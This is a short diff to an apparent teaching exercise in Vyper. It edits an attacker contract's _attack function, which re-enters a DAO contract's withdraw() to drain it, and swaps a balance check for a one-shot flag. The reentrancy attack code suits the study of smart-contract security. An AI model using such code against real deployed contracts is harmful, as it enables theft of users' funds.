@@ -10,11 +10,13 @@ event DefaultCall:
 dao_address: public(address)
 owner_address: public(address)
 attack_counter: public(uint256)
+is_attack: public(bool)
 
 @external
 def __init__():
     self.dao_address = ZERO_ADDRESS
     self.owner_address = ZERO_ADDRESS
+    self.is_attack = True
 
 @internal
 @payable
@@ -23,8 +25,9 @@ def _attack() -> bool:
     
     # TODO: Use the DAO interface to withdraw funds.
     # Make sure you add a "base case" to end the recursion
-    if self.dao_address.balance > 0:
+    if self.is_attack:
         DAO(self.dao_address).withdraw()
+        self.is_attack = False
 
     return True
 
